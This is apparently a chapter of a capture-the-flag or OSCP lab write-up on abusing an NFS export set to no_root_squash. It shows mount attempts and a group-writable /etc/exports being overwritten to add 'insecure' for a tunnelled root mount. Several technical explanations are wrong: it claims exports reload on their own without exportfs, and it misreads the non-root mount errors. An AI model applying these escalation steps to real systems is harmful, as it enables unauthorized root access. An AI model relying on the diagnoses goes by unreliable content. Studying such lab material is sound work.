# 05 — Why the direct mount is refused

An NFS export with `no_root_squash` looks like a one-command win. From the exam network it is not:
the mount is refused before any file is written.

## 5.1 The obvious attempt

```bash
kali@kali:~/exam$ sudo mkdir -p /mnt/nfs
kali@kali:~/exam$ sudo mount -t nfs 172.16.97.110:/usr/upload /mnt/nfs
```

```text
mount.nfs: access denied by server while mounting 172.16.97.110:/usr/upload
```

The server answered — this is not a firewall drop, a timeout or a missing `nfs-common`. It parsed the
request, compared the client against the export rule, and said no.

## 5.2 The rule is the reason

The export is:

```text
/usr/upload localhost(rw,sync,no_root_squash)
```

`localhost` is matched against the source address of the mount request. From Kali that address is
`10.10.14.47`, which is not `127.0.0.1`, so the server refuses the mount. The `no_root_squash` option
never comes into play: the mount is rejected at the authorization step.

```text
client 10.10.14.47  ──►  172.16.97.110:2049   source address ≠ localhost   ✗
```

This is also why scanning harder does not help. The port is open, the service is healthy, and the
answer is a policy decision. More enumeration produces the same denial.

## 5.3 Attempts on the host itself

Mounting the export from the target to prove it works is a reasonable check, but the mount point has
to exist and the options have to be valid:

```bash
matt@oscp:~$ mount -t nfs 127.0.0.1:/usr/upload /home/matt/Desktop
mount: /home/matt/Desktop: can't find in /etc/fstab.
```

```bash
matt@oscp:~$ mount -t nfs -o rw localhost:/usr/upload /mnt
mount.nfs: failed to apply fstab options
```

Both errors are local: a mount point that does not exist, and a helper that cannot apply the option
string. Neither says anything about the export. On the host, `sudo mount -t nfs 127.0.0.1:/usr/upload
/mnt/nfs` succeeds, because the source address really is `127.0.0.1` — a useful confirmation that the
export itself is fine.

## 5.4 The missing option

`insecure` is not cosmetic. Even once the request appears to come from `127.0.0.1`, NFS applies the
reserved-port rule: a request must originate from a source port below 1024. A mount forwarded through
an SSH tunnel leaves the client from an ephemeral port, so the server sees a high port and refuses
under the default `secure` behaviour.

The export file is writable by group `adm`, and `matt` is in `adm`, so the fix does not need root on
the target. It does need care: `sed -i` writes a temporary file next to the original and renames it,
which requires write permission on `/etc` itself — and `matt` does not have that. The content can be
replaced, the inode cannot:

```bash
matt@oscp:~$ cp /etc/exports /tmp/exports
matt@oscp:~$ sed -i 's/no_root_squash)/no_root_squash,insecure)/' /tmp/exports
matt@oscp:~$ cat /tmp/exports > /etc/exports
matt@oscp:~$ tail -n 1 /etc/exports
/usr/upload localhost(rw,sync,no_root_squash,insecure)
```

`cat > file` truncates and writes the existing inode, so file write permission is enough. The same
edit attempted as `sed -i /etc/exports` fails with
`sed: couldn't open temporary file /etc/sedXXXXXX: Permission denied`, even though the file itself is
writable.

The export table is rebuilt from the file when it changes, so no service restart or `exportfs` call
is needed — and `matt` could not run one anyway.

```text
-rw-rw-r-- 1 root adm 404 Jul 21 20:11 /etc/exports
```

The modification time records the edit. Nothing else on the host was modified to make the
escalation work.

## 5.5 What the failures teach

| Symptom | Wrong conclusion | Actual cause |
|---|---|---|
| `access denied by server` | firewall, wrong port, bad `nfs-common` | source address does not match `localhost` |
| `can't find in /etc/fstab` | the export is broken | the mount point does not exist on the client |
| `failed to apply fstab options` | unsupported NFS version | malformed option string on the command line |
| works on the host, fails from Kali | the export is read-only | same address rule, different source |

The box is not defended by a patch. It is defended by an address restriction that a tunnel satisfies
and by a port rule that one extra option disables.

---

**Next:** [`06-tunnel-and-mount.md`](06-tunnel-and-mount.md)
